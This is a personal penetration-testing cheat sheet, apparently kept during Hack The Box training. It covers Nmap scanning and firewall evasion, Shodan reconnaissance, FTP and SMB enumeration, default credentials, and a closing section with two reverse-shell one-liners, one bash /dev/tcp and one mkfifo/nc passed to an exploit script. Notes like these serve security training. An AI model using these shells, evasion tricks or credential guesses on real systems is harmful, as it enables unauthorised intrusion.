## Nmap

### Flag

| Flag                         | Usage                                                                          |
| ---------------------------- | ------------------------------------------------------------------------------ |
| `--disable-arp-ping`         | Disables ARP ping.                                                             |
| `--packet-trace`             | Shows all packets sent and received.                                           |
| `--reason`                   | Displays the reason a port is in a particular state.                           |
| `--stats-every=5s`           | Shows the progress of the scan every 5 seconds.                                |
| `--top-ports=10`             | Scans the specified top ports that have been defined as most frequent.         |
| `-F`                         | Scans top 100 ports.                                                           |
| `-iL`                        | Performs defined scans against targets in provided 'hosts.lst' list.           |
| `-n`                         | Disables DNS resolution.                                                       |
| `-oA tnet`                   | Stores the results in all formats starting with the name 'tnet'.               |
| `-p-`                        | All port                                                                       |
| `-Pn`                        | Disables ICMP Echo requests.                                                   |
| `-sn`                        | Disables port scanning.                                                        |
| `-sU, sT`                    | UDP/TCP scan                                                                   |
| `-sV`                        | Performs a service scan.                                                       |
| `-v`                         | Increases the verbosity of the scan, which displays more detailed information. |
| `--max-retries`              | Sets the number of retries that will be performed during the scan.             |
| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout.                          |
| `--max-rtt-timeout 100ms`    | Sets the specified time value as maximum RTT timeout.                          |
### Most commonly used
#### Default
```
sudo grc nmap -sC -sV -O -oA initial IP
```
#### All port
```
sudo grc nmap -sC -sV -O -p- -oA full IP
```

#### UDP
```
sudo grc nmap -sU -p- -oA udp IP
```

> Other hosts ignore the default **ICMP echo requests** because of their firewall configurations

#### List scan
```
sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5
10.129.2.18-20 //if host are next to each other
```

Check if host is alive: `--reason`
An `ICMP echo request` can help us determine if our target is alive and identify its system. (Through TTL):
- Linux/Mac OS: 64
- Windows: 128
- Cisco Routers: 255

### XML output,
```
xsltproc target.xml -o target.html
```

Use netcat and tcpdump to gain the information that nmap doesn't show us

Nmap scan 1000 port by default with root - SYN scan (-sS), non-root use regular TCP scan (-sT).
#### Port
define by:
+ one by one (list)
+ range 
+ `-top-port=10`
+ `-p-`
+ top 100 ports (-F)
#### Connect scan (-sT)
+ Establish full TCP three-way handshake
+ One of the least stealthy
+ Highly accurate
+ Minimal impact on the target services.

#### SYN scan (half-open scan)
- leaving the connection incomplete after sending the initial SYN packet
- Advanced IDS/IPS systems, however, have adapted to detect even these subtler techniques.

#### UDP Scan
+ error code 3: closed
+ other: open/filtered


### Nmap scripting engine (NSE)
| **Category** | **Description**                                                                                                                         |
| ------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| `auth`       | Determination of authentication credentials.                                                                                            |
| `broadcast`  | Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans. |
| `brute`      | Executes scripts that try to log in to the respective service by brute-forcing with credentials.                                        |
| `default`    | Default scripts executed by using the `-sC` option.                                                                                     |
| `discovery`  | Evaluation of accessible services.                                                                                                      |
| `dos`        | These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.              |
| `exploit`    | This category of scripts tries to exploit known vulnerabilities for the scanned port.                                                   |
| `external`   | Scripts that use external services for further processing.                                                                              |
| `fuzzer`     | This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.     |
| `intrusive`  | Intrusive scripts that could negatively affect the target system.                                                                       |
| `malware`    | Checks if some malware infects the target system.                                                                                       |
| `safe`       | Defensive scripts that do not perform intrusive and destructive access.                                                                 |
| `version`    | Extension for service detection.                                                                                                        |
| `vuln`       | Identification of specific vulnerabilities.                                                                                             |
| `-D`         | Decoy scanning                                                                                                                          |
Specific Script: `--script <category>`
Defined script: `--script <script-name>, <>, <>`
#### Timing
- `-T 0` / `-T paranoid`
- `-T 1` / `-T sneaky`
- `-T 2` / `-T polite`
- `-T 3` / `-T normal` **(Default)**
- `-T 4` / `-T aggressive`
- `-T 5` / `-T insane`

### Firewall, IDS/IPS

IDS: Intrusion detection system. Scan, analyze and report any potential attack
IPS: Intrusion prevention system. Taking specific defensive measure.
IDS/IPS is based on pattern matching and signature.

Nmap's TCP ACK scan (`-sA`) method is much harder to filter for firewalls and IDS/IPS systems than regular SYN (`-sS`) or Connect scans (`sT`) because they only send a TCP packet with only the `ACK` flag.
### Decoys

Type of scan can be used: SYN, ACK, ICMP and OS detection.
Try:
- a list of IP `-D RND 'number of random IP'`
- a different source of IP, `-S #IP`
- a different port, `--source-port 53'
The purpose here is to find which port/IP is not filtered on the target machine.

The company DNS server is trusted more than those from the internet -> The idea to use port 53 serving the DNS Server to interact with the hosts of the internal network.

Netcat can also connect from a specific port using the same command.
```
sudo ncat -nv --source-port 53 10.129.50.108 50000
sudo nc -p 53 10.129.50.108 50000
```




#### Domain information using shodan 



| **Layer**                | **Description**                                                                                        | **Information Categories**                                                                         |
| ------------------------ | ------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `1. Internet Presence`   | Identification of internet presence and externally accessible infrastructure.                          | Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures      |
| `2. Gateway`             | Identify the possible security measures to protect the company's external and internal infrastructure. | Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare                  |
| `3. Accessible Services` | Identify accessible interfaces and services that are hosted externally or internally.                  | Service Type, Functionality, Configuration, Port, Version, Interface                               |
| `4. Processes`           | Identify the internal processes, sources, and destinations associated with the services.               | PID, Processed Data, Tasks, Source, Destination                                                    |
| `5. Privileges`          | Identification of the internal permissions and privileges to the accessible services.                  | Groups, Users, Permissions, Restrictions, Environment                                              |
| `6. OS Setup`            | Identification of the internal components and systems setup.                                           | OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files |

 

```
nguyenhobbes2002@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
nguyenhobbes2002@htb[/htb]$ for i in $(cat ip-addresses.txt);do shodan host $i;done

10.129.24.93
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-09-01T09:02:11.370085
Number of open ports:    2

Ports:
     80/tcp nginx 
    443/tcp nginx 
	
10.129.27.33
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-08-30T22:25:31.572717
Number of open ports:    3

Ports:
     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)
     80/tcp nginx 
    443/tcp nginx 
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2
				
10.129.27.22
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-09-01T15:39:55.446281
Number of open ports:    8

Ports:
     25/tcp  
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3
     53/tcp  
     53/udp  
     80/tcp Apache httpd 
     81/tcp Apache httpd 
    110/tcp  
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2
    111/tcp  
    443/tcp Apache httpd 
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2
                Fingerprint:   RFC3526/Oakley Group 14
    444/tcp  
		
10.129.27.33
City:                    Berlin
Country:                 Germany
Organization:            InlaneFreight
Updated:                 2021-08-30T22:25:31.572717
Number of open ports:    3

Ports:
     22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3)
     80/tcp nginx 
    443/tcp nginx 
        |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2
        |-- Diffie-Hellman Parameters:
                Bits:          2048
                Generator:     2
```

### DNS Record


#### Upgrade TTY
```
script /dev/null -qc /bin/bash  
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 30 columns 100; reset;
```

### FTP
Configuration file:
```
cat /etc/vsftpd.conf | grep -v "#"
```

| Setting                                              | Description                                                                                              |
| ---------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| `listen=NO`                                          | Run from inetd or as a standalone daemon?                                                                |
| `listen_ipv6=YES`                                    | Listen on IPv6 ?                                                                                         |
| `anonymous_enable=NO`                                | Enable Anonymous access?                                                                                 |
| `local_enable=YES`                                   | Allow local users to login?                                                                              |
| `dirmessage_enable=YES`                              | Display active directory messages when users go into certain directories?                                |
| `use_localtime=YES`                                  | Use local time?                                                                                          |
| `xferlog_enable=YES`                                 | Activate logging of uploads/downloads?                                                                   |
| `connect_from_port_20=YES`                           | Connect from port 20?                                                                                    |
| `secure_chroot_dir=/var/run/vsftpd/empty`            | Name of an empty directory                                                                               |
| `pam_service_name=vsftpd`                            | This string is the name of the PAM service vsftpd will use.                                              |
| `rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem` | The last three options specify the location of the RSA certificate to use for SSL encrypted connections. |

In addition, there is a file called `/etc/ftpusers` that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. In the following example, the users `guest`, `john`, and `kevin` are not permitted to log in to the FTP service, even if they exist on the Linux system.

#### Dangerous Settings

There are many different security-related settings we can make on each FTP server. These can have various purposes, such as testing connections through the firewalls, testing routes, and authentication mechanisms. One of these authentication mechanisms is the `anonymous` user. This is often used to allow everyone on the internal network to share files and data without accessing each other's computers. With vsFTPd, the [optional settings](http://vsftpd.beasts.org/vsftpd_conf.html) that can be added to the configuration file for the anonymous login look like this:

|**Setting**|**Description**|
|---|---|
|`anonymous_enable=YES`|Allowing anonymous login?|
|`anon_upload_enable=YES`|Allowing anonymous to upload files?|
|`anon_mkdir_write_enable=YES`|Allowing anonymous to create new directories?|
|`no_anon_password=YES`|Do not ask anonymous for password?|
|`anon_root=/home/username/ftp`|Directory for anonymous.|
|`write_enable=YES`|Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?|

|**Setting**|**Description**|
|---|---|
|`dirmessage_enable=YES`|Show a message when they first enter a new directory?|
|`chown_uploads=YES`|Change ownership of anonymously uploaded files?|
|`chown_username=username`|User who is given ownership of anonymously uploaded files.|
|`local_enable=YES`|Enable local users to login?|
|`chroot_local_user=YES`|Place local users into their home directory?|
|`chroot_list_enable=YES`|Use a list of local users that will be placed in their home directory?|

|**Setting**|**Description**|
|---|---|
|`hide_ids=YES`|All user and group information in directory listings will be displayed as "ftp".|
|`ls_recurse_enable=YES`|Allows the use of recurse listings.|
Another helpful setting we can use for our purposes is the `ls_recurse_enable=YES`. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.
```
ls -R
```

Some commands should be used occasionally, as these will make the server show us more information that we can use for our purposes. These commands include `debug` and `trace`.
#### Download All Available Files
```shell-session
wget -m --no-passive ftp://anonymous:anonymous@[IP Address]
```


#### Script for FTP 
```shell-session
find / -type f -name ftp* 2>/dev/null | grep scripts
```


### SMB
| **SMB Version** | **Supported**                       | **Features**                                                           |
| --------------- | ----------------------------------- | ---------------------------------------------------------------------- |
| CIFS            | Windows NT 4.0                      | Communication via NetBIOS interface                                    |
| SMB 1.0         | Windows 2000                        | Direct connection via TCP                                              |
| SMB 2.0         | Windows Vista, Windows Server 2008  | Performance upgrades, improved message signing, caching feature        |
| SMB 2.1         | Windows 7, Windows Server 2008 R2   | Locking mechanisms                                                     |
| SMB 3.0         | Windows 8, Windows Server 2012      | Multichannel connections, end-to-end encryption, remote storage access |
| SMB 3.0.2       | Windows 8.1, Windows Server 2012 R2 |                                                                        |
| SMB 3.1.1       | Windows 10, Windows Server 2016     | Integrity checking, AES-128 encryption                                 |
```
sudo tcpdump -i tun0 port 389
```

- sudo: Run this via root also known as admin. 
- tcpdump: Is the program or software that is Wireshark except, it's a command line version. 
- -i: Selecting interface. (Example eth0, wlan, tun0) 
- port 389: Selecting the port we are listening on.

- admin:admin 
- administrator:administrator 
- admin:administrator 
- admin:password 
- administrator:password

Every ssh key save in id_rsa and `chmod 400` to make it private

Open text file in 
	Window: type
	Linux: cat, less

#### Privilege Escalation
Window: whoami /priv
Linux: sudo -l

tac: cat but in reverse

PHP has Type Juggling
TLDR: check for not empty `==` 
"A" == True -> True


### Reverse shell
```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.4/2408 0>&1'
```
```
python3 poc.py http://crm.board.htb admin admin 'sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.7 2408 >/tmp/f'
```

```
cat /etc/passwd | grep /home
```